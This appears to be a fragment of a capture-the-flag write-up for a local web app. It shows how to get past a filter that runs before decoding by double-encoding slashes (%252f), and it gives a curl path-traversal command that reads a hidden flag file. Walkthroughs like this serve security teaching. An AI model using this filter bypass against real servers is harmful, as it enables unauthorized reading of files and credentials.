visits:
http://localhost:5000

Try basic traversals,but application sanitizes
- `..`
- `/`
- `flag`
- `etc`

So direct traversal is blocked.
Step 3 — Try Double-Encoded Bypass

The server **sanitizes before decoding**, and decodes user input only once.
Meaning we can bypass filters by double encoding `/`.
Normal `/`: /

URL encoded once: %2f
Encoded twice:%252f

curl "http://localhost:5000/view?file=..%252fsecret%252fvery%252fhidden%252fflag.txt"
